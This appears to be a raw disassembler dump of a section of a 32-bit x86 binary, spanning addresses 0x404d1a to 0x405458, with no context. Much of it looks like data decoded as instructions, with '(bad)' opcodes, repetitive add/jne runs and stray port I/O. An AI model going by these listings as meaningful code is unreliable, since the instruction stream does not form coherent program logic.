  404d1a:	add    al,0x8
  404d1c:	add    BYTE PTR [eax],al
  404d1e:	add    BYTE PTR [eax],al
  404d20:	add    BYTE PTR [ebp-0x43],dh
  404d23:	add    ecx,DWORD PTR [eax]
  404d25:	jne    0x404d64
  404d27:	add    al,0x8
  404d29:	jne    0x404d28
  404d2b:	add    ecx,DWORD PTR [eax]
  404d2d:	jne    0x404dac
  404d2f:	add    al,0x8
  404d31:	jne    0x404cc0
  404d33:	add    ecx,DWORD PTR [eax]
  404d35:	jne    0x404d44
  404d37:	add    al,0x8
  404d39:	jne    0x404d88
  404d3b:	add    ecx,DWORD PTR [eax]
  404d3d:	jne    0x404d0c
  404d3f:	add    ecx,DWORD PTR [eax]
  404d41:	jne    0x404cd0
  404d43:	add    ecx,DWORD PTR [eax]
  404d45:	jne    0x404d54
  404d47:	add    al,0x8
  404d49:	jne    0x404d98
  404d4b:	add    ecx,DWORD PTR [eax]
  404d4d:	jne    0x404d1c
  404d4f:	add    ecx,DWORD PTR [eax]
  404d51:	jne    0x404ce8
  404d53:	add    ecx,DWORD PTR [eax]
  404d55:	jne    0x404d6c
  404d57:	add    al,0x8
  404d59:	jne    0x404dc0
  404d5b:	add    ecx,DWORD PTR [eax]
  404d5d:	jne    0x404d44
  404d5f:	add    ecx,DWORD PTR [eax]
  404d61:	jne    0x404d18
  404d63:	add    ecx,DWORD PTR [eax]
  404d65:	jne    0x404d9c
  404d67:	add    al,0x8
  404d69:	jne    0x404cf0
  404d6b:	add    ecx,DWORD PTR [eax]
  404d6d:	jne    0x404d74
  404d6f:	add    al,0x8
  404d71:	jne    0x404d78
  404d73:	add    al,0x8
  404d75:	jne    0x404cfc
  404d77:	add    ecx,DWORD PTR [eax]
  404d79:	jne    0x404d4e
  404d7b:	add    ecx,DWORD PTR [eax]
  404d7d:	jne    0x404dd2
  404d7f:	add    ecx,DWORD PTR [eax]
  404d81:	jne    0x404d86
  404d83:	add    al,0x8
  404d85:	add    BYTE PTR [eax],al
  404d87:	add    BYTE PTR [eax],al
  404d89:	add    BYTE PTR [ebp-0x7d],dh
  404d8c:	add    ecx,DWORD PTR [eax]
  404d8e:	jne    0x404d63
  404d90:	add    ecx,DWORD PTR [eax]
  404d92:	jne    0x404de7
  404d94:	add    ecx,DWORD PTR [eax]
  404d96:	jne    0x404d9a
  404d98:	out    dx,eax
  404d99:	add    ebp,DWORD PTR [ebp+0x2]
  404d9c:	add    edi,DWORD PTR [di+0x2]
  404da0:	das    
  404da1:	add    al,0x7d
  404da3:	add    ah,BYTE PTR [edi-0x30fd92fd]
  404da9:	add    ebp,DWORD PTR [ebp+0x2]
  404dac:	inc    edi
  404dad:	add    edi,DWORD PTR [ebp+0x2]
  404db0:	(bad)  
  404db2:	jge    0x404db6
  404db4:	xchg   DWORD PTR [ebx],eax
  404db6:	ins    DWORD PTR es:[edi],dx
  404db7:	add    bh,bh
  404db9:	add    ebp,DWORD PTR [ebp+0x2]
  404dbc:	ja     0x404dc1
  404dbe:	jge    0x404dc2
  404dc0:	mov    edi,0x37027d03
  404dc5:	add    ebp,DWORD PTR [ebp+0x2]
  404dc8:	inc    DWORD PTR [ebx]
  404dca:	ins    DWORD PTR es:[edi],dx
  404dcb:	add    dh,BYTE PTR [edi+0x3]
  404dce:	jge    0x404dd2
  404dd0:	mov    edi,0x37027d03
  404dd5:	add    ebp,DWORD PTR [ebp+0x2]
  404dd8:	test   DWORD PTR [ebx],0x36f026d
  404dde:	jge    0x404de2
  404de0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404de1:	add    edi,DWORD PTR [ebp+0x2]
  404de4:	pop    ds
  404de5:	add    ebp,DWORD PTR [ebp+0x2]
  404de8:	xlat   BYTE PTR ds:[ebx]
  404de9:	add    ebp,DWORD PTR [ebp+0x2]
  404dec:	dec    edi
  404ded:	add    eax,DWORD PTR [eax]
  404def:	add    BYTE PTR [eax],al
  404df1:	add    BYTE PTR [eax],al
  404df3:	jge    0x404df7
  404df5:	xchg   DWORD PTR [ebx],eax
  404df7:	jge    0x404dfb
  404df9:	inc    DWORD PTR [edx]
  404dfb:	ins    DWORD PTR es:[edi],dx
  404dfc:	add    al,BYTE PTR [edi]
  404dfe:	add    al,0x6d
  404e00:	add    bh,BYTE PTR [edi+0x4]
  404e03:	jge    0x404e07
  404e05:	aaa    
  404e06:	add    al,0x7d
  404e08:	add    ch,BYTE PTR [edi+0x7026d04]
  404e0e:	add    al,0x6d
  404e10:	add    bh,BYTE PTR [edi+0x4]
  404e13:	jge    0x404e17
  404e15:	add    BYTE PTR [edi],dh
  404e17:	jno    0x404e13
  404e19:	jmp    FWORD PTR [esi-0x18000587]
  404e1f:	jbe    0x404e1b
  404e21:	jmp    DWORD PTR [edi+0x79]
  404e24:	cli    
  404e25:	jmp    DWORD PTR [edi]
  404e27:	jno    0x404e23
  404e29:	jmp    DWORD PTR [edi-0x38000587]
  404e2f:	jbe    0x404e2b
  404e31:	inc    DWORD PTR [edi+0x79]
  404e34:	cli    
  404e35:	inc    DWORD PTR [edi]
  404e37:	jno    0x404e33
  404e39:	inc    DWORD PTR [edi-0x8000587]
  404e3f:	jbe    0x404e3b
  404e41:	push   DWORD PTR [edi+0x79]
  404e44:	cli    
  404e45:	push   DWORD PTR [edi+0x37fffa76]
  404e4b:	jns    0x404e47
  404e4d:	push   edi
  404e4f:	jbe    0x404e4b
  404e51:	push   DWORD PTR [edi+0x79]
  404e54:	cli    
  404e55:	push   DWORD PTR [edi+0x0]
  404e5b:	add    BYTE PTR [esi-0x6],dh
  404e5e:	push   DWORD PTR [edi]
  404e60:	jns    0x404e5c
  404e62:	(bad)  
  404e63:	out    dx,eax
  404e64:	jbe    0x404e60
  404e66:	jmp    FWORD PTR [edi+0x79]
  404e69:	cli    
  404e6a:	call   FWORD PTR [edi+0x1ffffa76]
  404e70:	jns    0x404e6c
  404e72:	dec    edi
  404e74:	jbe    0x404e70
  404e76:	dec    DWORD PTR [edi+0x79]
  404e79:	cli    
  404e7a:	(bad)  
  404e7b:	jg     0x404ef3
  404e7d:	cli    
  404e7e:	(bad)  
  404e7f:	(bad)  
  404e80:	jns    0x404e7c
  404e82:	(bad)  
  404e83:	push   DWORD PTR [ecx-0x6]
  404e86:	(bad)  
  404e87:	jg     0x404eff
  404e89:	cli    
  404e8a:	jmp    FWORD PTR [edi]
  404e8c:	jno    0x404e88
  404e8e:	jmp    FWORD PTR [edi-0x58a]
  404e94:	jne    0x404e94
  404e96:	pop    es
  404e97:	add    ch,dh
  404e99:	add    DWORD PTR [eax],ecx
  404e9b:	add    BYTE PTR [ebp+0x50007fe],al
  404ea1:	add    cl,BYTE PTR [eax]
  404ea3:	add    BYTE PTR [ecx+0x2],cl
  404ea6:	or     BYTE PTR [eax],al
  404ea8:	cdq    
  404ea9:	add    DWORD PTR [eax],ecx
  404eab:	add    BYTE PTR [ecx-0x2],bl
  404eae:	pop    es
  404eaf:	add    cl,bl
  404eb1:	add    DWORD PTR [eax],ecx
  404eb3:	add    BYTE PTR [ecx],ch
  404eb5:	add    cl,BYTE PTR [eax]
  404eb7:	add    BYTE PTR [ecx+0x79000801],bh
  404ebd:	inc    BYTE PTR [edi]
  404ebf:	add    BYTE PTR [eax],al
  404ec1:	add    BYTE PTR [eax],al
  404ec3:	add    BYTE PTR [eax],al
  404ec5:	stc    
  404ec6:	add    DWORD PTR [eax],ecx
  404ec8:	add    cl,bh
  404eca:	add    DWORD PTR [eax],ecx
  404ecc:	add    BYTE PTR [ecx+0x1],ch
  404ecf:	or     BYTE PTR [eax],al
  404ed1:	sub    DWORD PTR [edx],eax
  404ed3:	or     BYTE PTR [eax],al
  404ed5:	test   eax,0xd9000801
  404eda:	add    DWORD PTR [eax],ecx
  404edc:	add    BYTE PTR [ecx+0x1],cl
  404edf:	or     BYTE PTR [eax],al
  404ee1:	or     DWORD PTR [edx],eax
  404ee3:	or     BYTE PTR [eax],al
  404ee5:	mov    DWORD PTR [ecx],eax
  404ee7:	or     BYTE PTR [eax],al
  404ee9:	rol    DWORD PTR [ecx],0x8
  404eec:	add    BYTE PTR [ecx],ah
  404eee:	add    DWORD PTR [eax],ecx
  404ef0:	add    cl,dl
  404ef2:	add    DWORD PTR [eax],ecx
  404ef4:	add    BYTE PTR [ecx-0x3efff7ff],al
  404efa:	add    DWORD PTR [eax],ecx
  404efc:	add    BYTE PTR [ecx+0x1],al
  404eff:	or     BYTE PTR [eax],al
  404f01:	icebp  
  404f02:	add    DWORD PTR [eax],ecx
  404f04:	add    BYTE PTR [ecx+0x71000800],al
  404f0a:	inc    BYTE PTR [edi]
  404f0c:	add    cl,dh
  404f0e:	inc    BYTE PTR [edi]
  404f10:	add    BYTE PTR [ebp-0x32],dh
  404f13:	add    ecx,DWORD PTR [eax]
  404f15:	jne    0x404f6d
  404f17:	add    al,0x8
  404f19:	jne    0x404f19
  404f1b:	add    ecx,DWORD PTR [eax]
  404f1d:	jne    0x404f25
  404f1f:	add    al,0x8
  404f21:	jne    0x404ef1
  404f23:	add    ecx,DWORD PTR [eax]
  404f25:	jne    0x404f7d
  404f27:	add    al,0x8
  404f29:	add    BYTE PTR [eax],al
  404f2b:	add    BYTE PTR [eax],al
  404f2d:	add    BYTE PTR [ebp-0x78],dh
  404f30:	add    ecx,DWORD PTR [ecx]
  404f32:	jne    0x404ebc
  404f34:	add    al,0x9
  404f36:	jne    0x404f40
  404f38:	add    al,0x9
  404f3a:	jne    0x404f44
  404f3c:	add    eax,0x3e87509
  404f41:	or     DWORD PTR [ebp-0x18],esi
  404f44:	add    al,0x9
  404f46:	jne    0x404fb0
  404f48:	add    al,0x9
  404f4a:	jne    0x404fb4
  404f4c:	add    eax,0x3e87509
  404f51:	or     DWORD PTR [ebp-0x18],esi
  404f54:	add    al,0x9
  404f56:	jne    0x404fc0
  404f58:	add    al,0x9
  404f5a:	jne    0x404fc4
  404f5c:	add    eax,0x3487509
  404f61:	or     DWORD PTR [ebp+0x48],esi
  404f64:	add    al,0x9
  404f66:	jne    0x404f30
  404f68:	add    ecx,DWORD PTR [ecx]
  404f6a:	jne    0x404f34
  404f6c:	add    al,0x9
  404f6e:	jne    0x404f00
  404f70:	add    ecx,DWORD PTR [ecx]
  404f72:	jne    0x404f04
  404f74:	add    al,0x9
  404f76:	jne    0x404f98
  404f78:	add    al,0x9
  404f7a:	jne    0x404f9c
  404f7c:	add    eax,0x3507509
  404f81:	or     DWORD PTR [ebp+0x50],esi
  404f84:	add    al,0x9
  404f86:	jne    0x404f68
  404f88:	add    ecx,DWORD PTR [ecx]
  404f8a:	jne    0x404f6c
  404f8c:	add    al,0x9
  404f8e:	jne    0x404f92
  404f90:	adc    al,BYTE PTR [eax+eax*1]
  404f93:	add    BYTE PTR [eax],al
  404f95:	add    BYTE PTR [eax],al
  404f97:	jl     0x404f9b
  404f99:	adc    al,BYTE PTR ds:0x382027c
  404f9f:	ins    BYTE PTR es:[edi],dx
  404fa0:	add    al,BYTE PTR [edx+0x52026c04]
  404fa6:	add    al,0x7c
  404fa8:	add    dl,BYTE PTR [edx+0x5]
  404fab:	jl     0x404faf
  404fad:	ret    0x6c03
  404fb0:	add    al,dl
  404fb2:	add    al,0x6c
  404fb4:	add    al,BYTE PTR [edx]
  404fb6:	add    al,0x7c
  404fb8:	add    al,BYTE PTR [edx]
  404fba:	add    eax,0x372027c
  404fbf:	ins    BYTE PTR es:[edi],dx
  404fc0:	add    dh,BYTE PTR [edx+0x4]
  404fc3:	ins    BYTE PTR es:[edi],dx
  404fc4:	add    ah,BYTE PTR [edx]
  404fc6:	add    al,0x7c
  404fc8:	add    ah,BYTE PTR [edx]
  404fca:	add    eax,0x392027c
  404fcf:	ins    BYTE PTR es:[edi],dx
  404fd0:	add    dl,BYTE PTR [edx+0x22026c04]
  404fd6:	add    al,0x7c
  404fd8:	add    ah,BYTE PTR [edx]
  404fda:	add    eax,0x392027c
  404fdf:	ins    BYTE PTR es:[edi],dx
  404fe0:	add    dl,BYTE PTR [edx-0x3dfd93fc]
  404fe6:	add    edi,DWORD PTR [edx+eax*1-0x3e]
  404fea:	add    al,0x7c
  404fec:	add    dh,BYTE PTR [edx]
  404fee:	add    ebp,DWORD PTR [edx+eax*1+0x32]
  404ff2:	add    al,0x6c
  404ff4:	add    ch,dh
  404ff6:	add    edi,DWORD PTR [edx+eax*1-0x1a]
  404ffa:	add    al,0x0
  404ffc:	add    BYTE PTR [eax],al
  404ffe:	add    BYTE PTR [eax],al
  405000:	jl     0x405004
  405002:	outs   dx,BYTE PTR ds:[esi]
  405003:	add    ebp,DWORD PTR [edx+eax*1+0x66]
  405007:	add    al,0x6c
  405009:	add    ch,BYTE PTR [esi-0x59fd83fd]
  40500f:	add    al,0x7c
  405011:	add    al,BYTE PTR [eax]
  405013:	cs jbe 0x40500f
  405016:	jmp    DWORD PTR ds:0xdfff971
  40501c:	jns    0x405017
  40501e:	inc    DWORD PTR ds:0x8dfff976
  405024:	jns    0x40501f
  405026:	inc    DWORD PTR [ebp+0x4dfff976]
  40502c:	jns    0x405027
  40502e:	inc    DWORD PTR [ebp+0x76]
  405031:	stc    
  405032:	dec    ebp
  405034:	jns    0x40502f
  405036:	inc    ebp
  405038:	jbe    0x405033
  40503a:	(bad)  
  40503b:	std    
  40503c:	jbe    0x405037
  40503e:	push   ebp
  405040:	ja     0x40503b
  405042:	(bad)  
  405043:	jge    0x4050be
  405045:	stc    
  405046:	push   DWORD PTR [ebp+0x76]
  405049:	stc    
  40504a:	call   FWORD PTR ds:0x15fff979
  405050:	jbe    0x40504b
  405052:	call   FWORD PTR [ebp-0x6a000687]
  405058:	jbe    0x405053
  40505a:	call   FWORD PTR ds:0x15fff979
  405060:	jbe    0x40505b
  405062:	call   FWORD PTR [ebp+0x0]
  405068:	add    BYTE PTR [ecx-0x7],bh
  40506b:	call   DWORD PTR [ebp-0x4200068a]
  405071:	jbe    0x40506c
  405073:	push   DWORD PTR [ebp+0x3dfff977]
  405079:	jns    0x405074
  40507b:	push   DWORD PTR ds:0xf5fff976
  405081:	jbe    0x40507c
  405083:	(bad)  
  405084:	in     eax,dx
  405085:	ja     0x405080
  405087:	jmp    DWORD PTR [ebp+0x79]
  40508a:	stc    
  40508b:	call   FWORD PTR [ebp+0x76]
  40508e:	stc    
  40508f:	(bad)  
  405090:	dec    ebx
  405092:	dec    BYTE PTR [eax]
  405094:	add    bl,bl
  405096:	dec    DWORD PTR [eax]
  405098:	add    BYTE PTR [ebx-0x2],bl
  40509b:	or     BYTE PTR [eax],al
  40509d:	pop    ebx
  40509e:	dec    DWORD PTR [eax]
  4050a0:	add    BYTE PTR [ebx+0x7b000906],cl
  4050a6:	add    eax,0x5fb0009
  4050ab:	or     DWORD PTR [eax],eax
  4050ad:	fild   DWORD PTR [ecx+ecx*1]
  4050b0:	add    BYTE PTR [ebx-0x44fff6fa],ch
  4050b6:	add    eax,0x63b0009
  4050bb:	or     DWORD PTR [eax],eax
  4050bd:	sti    
  4050be:	add    al,0x9
  4050c0:	add    BYTE PTR [ebx+0x6],bh
  4050c3:	or     DWORD PTR [eax],eax
  4050c5:	sub    eax,DWORD PTR ds:0x5ab0009
  4050cb:	or     DWORD PTR [eax],eax
  4050cd:	add    BYTE PTR [eax],al
  4050cf:	add    BYTE PTR [eax],al
  4050d1:	add    BYTE PTR [ebx+0x5b000904],cl
  4050d7:	push   es
  4050d8:	or     DWORD PTR [eax],eax
  4050da:	imul   eax,DWORD PTR ds:0x5eb0009,0x9
  4050e1:	add    bl,ch
  4050e3:	add    al,0x9
  4050e5:	add    BYTE PTR [ebx-0x74fff6fa],bl
  4050eb:	add    eax,0x60b0009
  4050f0:	or     DWORD PTR [eax],eax
  4050f2:	jmp    0x4050f8
  4050f4:	or     DWORD PTR [eax],eax
  4050f6:	mov    ebx,0xb000905
  4050fb:	add    eax,0x58b0009
  405100:	or     DWORD PTR [eax],eax
  405102:	mov    eax,DWORD PTR [ecx+ecx*1]
  405105:	add    BYTE PTR [ebp+eax*1+0x5dc0007],bl
  40510c:	pop    es
  40510d:	add    BYTE PTR [ebp+0x4b],dh
  405110:	add    eax,DWORD PTR [edi]
  405112:	jne    0x40509f
  405114:	add    eax,DWORD PTR [edi]
  405116:	jne    0x405173
  405118:	add    eax,DWORD PTR [edi]
  40511a:	jne    0x4050b7
  40511c:	add    eax,DWORD PTR [edi]
  40511e:	jne    0x4050db
  405120:	add    eax,DWORD PTR [edi]
  405122:	jne    0x40511f
  405124:	add    al,BYTE PTR [edi]
  405126:	jne    0x40519b
  405128:	add    eax,DWORD PTR [edi]
  40512a:	jne    0x40515f
  40512c:	add    al,0x7
  40512e:	jne    0x405133
  405130:	add    al,0x7
  405132:	jne    0x4050f7
  405134:	add    eax,DWORD PTR [edi]
  405136:	add    BYTE PTR [eax],al
  405138:	add    BYTE PTR [eax],al
  40513a:	add    BYTE PTR [ebp+0x63],dh
  40513d:	add    eax,DWORD PTR [edi]
  40513f:	jne    0x405164
  405141:	add    al,0x7
  405143:	jne    0x4051b8
  405145:	add    eax,DWORD PTR [edi]
  405147:	jne    0x40517c
  405149:	add    al,0x7
  40514b:	jne    0x4051bc
  40514d:	add    eax,DWORD PTR [edi]
  40514f:	jne    0x405178
  405151:	add    al,0x7
  405153:	jne    0x4051a4
  405155:	add    eax,DWORD PTR [edi]
  405157:	jne    0x405160
  405159:	add    al,0x7
  40515b:	jne    0x4051bc
  40515d:	add    eax,DWORD PTR [edi]
  40515f:	jne    0x405178
  405161:	add    al,0x7
  405163:	jne    0x405124
  405165:	add    eax,DWORD PTR [edi]
  405167:	jne    0x4051e0
  405169:	add    eax,DWORD PTR [edi]
  40516b:	jne    0x4051d9
  40516d:	add    ecx,DWORD PTR [eax]
  40516f:	jne    0x40515d
  405171:	add    ecx,DWORD PTR [eax]
  405173:	jne    0x405121
  405175:	add    ecx,DWORD PTR [eax]
  405177:	jne    0x4051a5
  405179:	add    al,0x8
  40517b:	jne    0x405189
  40517d:	add    al,0x8
  40517f:	jne    0x40510d
  405181:	add    al,0x8
  405183:	jne    0x4051d1
  405185:	add    ecx,DWORD PTR [eax]
  405187:	jne    0x405155
  405189:	add    ecx,DWORD PTR [eax]
  40518b:	jne    0x40518f
  40518d:	jmp    0xf942c195
  405192:	add    edi,DWORD PTR [eax+0x2]
  405195:	loope  0x40519a
  405197:	jo     0x40519b
  405199:	icebp  
  40519a:	add    edi,DWORD PTR [eax+0x2]
  40519d:	in     eax,dx
  40519e:	add    eax,DWORD PTR [eax]
  4051a0:	add    BYTE PTR [eax],al
  4051a2:	add    BYTE PTR [eax],al
  4051a4:	jo     0x4051a8
  4051a6:	aad    0x3
  4051a8:	js     0x4051ac
  4051aa:	in     eax,0x3
  4051ac:	jo     0x4051b0
  4051ae:	int    0x3
  4051b0:	js     0x4051b4
  4051b2:	jmp    0x4051b7
  4051b4:	jo     0x4051b8
  4051b6:	sti    
  4051b7:	add    edi,DWORD PTR [eax+0x2]
  4051ba:	jecxz  0x4051bf
  4051bc:	jo     0x4051c0
  4051be:	repz add edi,DWORD PTR [eax+0x2]
  4051c2:	out    dx,eax
  4051c3:	add    esi,DWORD PTR [eax+0x2]
  4051c6:	xlat   BYTE PTR ds:[ebx]
  4051c7:	add    edi,DWORD PTR [eax+0x2]
  4051ca:	out    0x3,eax
  4051cc:	jo     0x4051d0
  4051ce:	iret   
  4051cf:	add    edi,DWORD PTR [eax+0x2]
  4051d2:	call   0xf842c1da
  4051d7:	add    edi,DWORD PTR [eax+0x2]
  4051da:	loopne 0x4051df
  4051dc:	jo     0x4051e0
  4051de:	lock add edi,DWORD PTR [eax+0x2]
  4051e2:	in     al,dx
  4051e3:	add    esi,DWORD PTR [eax+0x2]
  4051e6:	aam    0x3
  4051e8:	js     0x4051ec
  4051ea:	in     al,0x3
  4051ec:	jo     0x4051f0
  4051ee:	int3   
  4051ef:	add    edi,DWORD PTR [eax+0x2]
  4051f2:	jmp    0x7803:0xfa027003
  4051f9:	add    ah,dl
  4051fb:	add    esi,DWORD PTR [eax+0x2]
  4051fe:	repnz add edi,DWORD PTR [eax+0x2]
  405202:	out    dx,al
  405203:	add    esi,DWORD PTR [eax+0x2]
  405206:	(bad)  
  405207:	add    eax,DWORD PTR [eax]
  405209:	add    BYTE PTR [eax],al
  40520b:	add    BYTE PTR [eax],al
  40520d:	js     0x405211
  40520f:	add    cl,ch
  405211:	jno    0x405217
  405213:	add    esp,ebp
  405215:	jp     0x40521c
  405217:	add    eax,0x6087cef
  40521c:	out    0x6f,al
  40521e:	pop    es
  40521f:	pop    es
  405220:	loope  0x405290
  405222:	or     cl,BYTE PTR [eax]
  405224:	loope  0x4052a4
  405226:	or     cl,BYTE PTR [eax]
  405228:	lock jns 0x405234
  40522b:	or     eax,esi
  40522d:	jno    0x405238
  40522f:	or     ebx,esp
  405231:	push   0x80e30a0c
  405236:	or     al,0xa
  405238:	repz js 0x405247
  40523b:	or     dh,bl
  40523d:	jo     0x40524b
  40523f:	or     ah,dl
  405241:	imul   ecx,DWORD PTR [ebx],0xb81e20b
  405247:	or     esi,edx
  405249:	jns    0x405256
  40524b:	or     esi,edx
  40524d:	jno    0x40525a
  40524f:	or     esp,ebp
  405251:	push   0xe
  405253:	or     al,0xdd
  405255:	or     BYTE PTR [esi],0xc
  405258:	cmc    
  405259:	jp     0x405269
  40525b:	or     al,0xed
  40525d:	jb     0x40526d
  40525f:	or     al,0xe5
  405261:	push   0xe
  405263:	or     al,0xdd
  405265:	or     BYTE PTR [esi],0xc
  405268:	cmc    
  405269:	jp     0x405279
  40526b:	or     al,0xed
  40526d:	jb     0x40527d
  40526f:	or     al,0xe4
  405271:	add    BYTE PTR [eax],al
  405273:	add    BYTE PTR [eax],al
  405275:	add    BYTE PTR [ebx+0xd],ch
  405278:	or     eax,0xd0d83dc
  40527d:	hlt    
  40527e:	jnp    0x40528d
  405280:	or     eax,0xd0d73ec
  405285:	in     al,0x6b
  405287:	or     eax,0xd83dc0d
  40528c:	or     eax,0xd0fc100
  405291:	or     eax,0xd0d0fd1
  405296:	rcl    BYTE PTR [eax],cl
  405298:	push   cs
  405299:	push   cs
  40529a:	rcl    BYTE PTR [eax],cl
  40529c:	push   cs
  40529d:	push   cs
  40529e:	mov    ds:0x920e0e10,al
  4052a3:	adc    BYTE PTR [esi],cl
  4052a5:	push   cs
  4052a6:	xchg   edx,eax
  4052a7:	adc    BYTE PTR [esi],cl
  4052a9:	push   cs
  4052aa:	mov    dl,0x10
  4052ac:	push   cs
  4052ad:	push   cs
  4052ae:	adc    BYTE PTR [eax],0xe
  4052b1:	push   cs
  4052b2:	xchg   edx,eax
  4052b3:	adc    BYTE PTR [esi],cl
  4052b5:	push   cs
  4052b6:	xchg   edx,eax
  4052b7:	adc    BYTE PTR [esi],cl
  4052b9:	push   cs
  4052ba:	push   edx
  4052bb:	adc    al,0xe
  4052bd:	push   cs
  4052be:	bound  edx,QWORD PTR [esi+ecx*1]
  4052c1:	push   cs
  4052c2:	push   edx
  4052c3:	adc    al,0xe
  4052c5:	push   cs
  4052c6:	push   edx
  4052c7:	adc    al,0xe
  4052c9:	push   cs
  4052ca:	xor    dl,BYTE PTR [esi+ecx*1]
  4052cd:	push   cs
  4052ce:	inc    edx
  4052cf:	adc    al,0xe
  4052d1:	push   cs
  4052d2:	push   edx
  4052d3:	adc    al,0xe
  4052d5:	push   cs
  4052d6:	push   ebx
  4052d7:	adc    ecx,DWORD PTR [edi]
  4052d9:	sldt   WORD PTR [eax]
  4052dc:	add    BYTE PTR [eax],al
  4052de:	add    BYTE PTR [ebx+0x13],dl
  4052e1:	(bad)  
  4052e2:	mov    db2,ebx
  4052e5:	(bad)  
  4052e6:	movlps QWORD PTR [ebx],xmm2
  4052e9:	(bad)  
  4052ea:	movlps QWORD PTR [ebx],xmm2
  4052ed:	(bad)  
  4052ee:	rdpmc  
  4052f0:	adc    ecx,DWORD PTR [edi]
  4052f2:	lsl    edx,WORD PTR [ebx]
  4052f5:	(bad)  
  4052f6:	movlps QWORD PTR [ebx],xmm2
  4052f9:	(bad)  
  4052fa:	movlps QWORD PTR [ebx],xmm2
  4052fd:	(bad)  
  4052fe:	psrlq  mm2,QWORD PTR [edx]
  405301:	(bad)  
  405302:	pavgw  mm2,QWORD PTR [edx]
  405305:	(bad)  
  405306:	psrlq  mm2,QWORD PTR [edx]
  405309:	(bad)  
  40530a:	pcmpeqw mm4,QWORD PTR [eax+edx*1+0xf]
  40530f:	sbb    BYTE PTR [eax+edx*1+0xf],0x7a
  405314:	je     0x405326
  405316:	(bad)  
  405318:	ins    BYTE PTR es:[edi],dx
  405319:	adc    BYTE PTR [edi],cl
  40531b:	push   0x6b
  40531d:	add    edx,DWORD PTR [eax]
  40531f:	test   BYTE PTR [ecx+0x15],bl
  405322:	adc    eax,DWORD PTR [esi-0x76ebe881]
  405328:	jbe    0x405340
  40532a:	adc    eax,0x16197d80
  40532f:	imul   esi,DWORD PTR [ebp+0x19],0x16
  405333:	arpl   WORD PTR [eax+ebx*1+0x17],bx
  405337:	push   0x54
  405339:	sbb    BYTE PTR [edi],dl
  40533b:	bound  edx,QWORD PTR [ebx+0x1b]
  40533e:	sbb    BYTE PTR [ebp+0x181b53],cl
  405344:	add    BYTE PTR [eax],al
  405346:	add    BYTE PTR [eax],al
  405348:	lea    eax,[ebx]
  40534a:	sbb    al,0x18
  40534c:	jge    0x405351
  40534e:	sbb    al,0x18
  405350:	jge    0x4053c4
  405352:	sbb    al,0x19
  405354:	ins    BYTE PTR es:[edi],dx
  405355:	jb     0x405373
  405357:	sbb    DWORD PTR [edx+eiz*2+0x1c],ebp
  40535b:	sbb    DWORD PTR [edx+eiz*2+0x1c],ebx
  40535f:	sbb    DWORD PTR [ecx+edx*2+0x19],ebx
  405363:	sbb    cl,BYTE PTR [edi-0x70e5e6af]
  405369:	add    DWORD PTR [edx],ebx
  40536b:	sbb    bh,BYTE PTR [edi+0x1]
  40536e:	sbb    bl,BYTE PTR [edx]
  405370:	jg     0x4053e3
  405372:	sbb    DWORD PTR [edx],ebx
  405374:	outs   dx,DWORD PTR ds:[esi]
  405375:	jno    0x405390
  405377:	sbb    ch,BYTE PTR [edi+0x61]
  40537a:	sbb    DWORD PTR [edx],ebx
  40537c:	pop    edi
  40537d:	popa   
  40537e:	sbb    DWORD PTR [edx],ebx
  405380:	pop    edi
  405381:	push   eax
  405382:	sbb    bl,BYTE PTR [ebx]
  405384:	mov    ss,WORD PTR [eax+0x1a]
  405387:	sbb    ecx,DWORD PTR [esi+0x7e1b0202]
  40538d:	sbb    DWORD PTR [edx],eax
  40538f:	sbb    edi,DWORD PTR [esi+0x19]
  405392:	repnz sbb ch,BYTE PTR [esi+0x19]
  405396:	repnz sbb ch,BYTE PTR [esi+0x19]
  40539a:	loop   0x4053b6
  40539c:	pop    esi
  40539d:	sbb    edx,esp
  40539f:	sbb    bl,BYTE PTR [esi+0x19]
  4053a2:	aad    0x1f
  4053a4:	xchg   ecx,eax
  4053a5:	push   ds
  4053a6:	int    0x1f
  4053a8:	mov    DWORD PTR [esi],ebx
  4053aa:	add    eax,0x20
  4053af:	add    BYTE PTR [eax],al
  4053b1:	sbb    DWORD PTR [esi],0x1e791ffd
  4053b7:	cmc    
  4053b8:	pop    ds
  4053b9:	jno    0x4053d9
  4053bb:	in     eax,dx
  4053bc:	pop    ds
  4053bd:	imul   ebx,DWORD PTR [esi],0x1e611fe5
  4053c3:	fstp   QWORD PTR [edi]
  4053c5:	pop    ecx
  4053c6:	push   ds
  4053c7:	aad    0x1f
  4053c9:	xchg   ecx,eax
  4053ca:	push   ds
  4053cb:	int    0x1f
  4053cd:	mov    DWORD PTR [esi],ebx
  4053cf:	add    eax,0xfd1e8120
  4053d4:	pop    ds
  4053d5:	jns    0x4053f5
  4053d7:	cmc    
  4053d8:	pop    ds
  4053d9:	jno    0x4053f9
  4053db:	in     eax,dx
  4053dc:	pop    ds
  4053dd:	imul   ebx,DWORD PTR [esi],0x1e611fe5
  4053e3:	fstp   QWORD PTR [edi]
  4053e5:	pop    ecx
  4053e6:	push   ds
  4053e7:	aam    0x20
  4053e9:	nop
  4053ea:	sbb    eax,0x1d8820cc
  4053ef:	add    al,0x21
  4053f1:	sbb    BYTE PTR ds:0x1d7820fc,0xf4
  4053f8:	and    BYTE PTR [eax+0x1d],dh
  4053fb:	in     al,dx
  4053fc:	and    BYTE PTR [eax+0x1d],ch
  4053ff:	in     al,0x20
  405401:	pusha  
  405402:	sbb    eax,0x1d5820dc
  405407:	add    ah,dl
  405409:	xchg   ebp,eax
  40540a:	sbb    eax,0x1d95cc1d
  40540f:	sbb    eax,0x1d1d9404
  405414:	cld    
  405415:	add    BYTE PTR [eax],al
  405417:	add    BYTE PTR [eax],al
  405419:	add    BYTE PTR [ebp-0x6a0be2e3],dl
  40541f:	sbb    eax,0x1d95ec1d
  405424:	sbb    eax,0x1d1d95e4
  405429:	fcom   QWORD PTR [ebp+0x79e91d1d]
  40542f:	add    BYTE PTR [ebx],al
  405431:	in     eax,0x7d
  405433:	add    al,0x7
  405435:	icebp  
  405436:	outs   dx,BYTE PTR ds:[esi]
  405437:	or     DWORD PTR [ecx],ecx
  405439:	rep ins BYTE PTR es:[edi],dx
  40543b:	pop    es
  40543c:	or     esp,ebp
  40543e:	or     BYTE PTR [esi],0xc
  405441:	fsub   QWORD PTR [ebp+0xd]
  405444:	or     eax,0xe0c70f7
  405449:	out    dx,al
  40544a:	imul   ecx,DWORD PTR [ebx],0xf
  40544d:	fld    DWORD PTR [esi-0x7926efee]
  405453:	adc    dl,BYTE PTR [eax]
  405455:	clc    
  405456:	xchg   DWORD PTR [ecx],edx
  405458:	adc    eax,edi
